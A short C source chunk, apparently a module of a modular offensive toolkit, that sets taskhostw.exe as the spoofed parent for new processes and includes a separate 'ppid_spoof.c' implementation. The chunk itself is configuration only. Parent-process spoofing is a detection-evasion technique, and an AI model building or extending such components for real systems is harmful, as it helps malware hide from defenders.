// chunk: process/ppid_spoof_taskhostw
// depends: (none)
// provides: spoof_ppid_create_process, ppid_spoof_auto
// headers: windows.h,tlhelp32.h
// note: Create child process with spoofed parent (taskhostw.exe) — Task Host Window

#ifndef CHUNK_PPID_SPOOF_TASKHOSTW
#define CHUNK_PPID_SPOOF_TASKHOSTW

#define PPID_TARGET "taskhostw.exe"

#include "ppid_spoof.c"

#endif
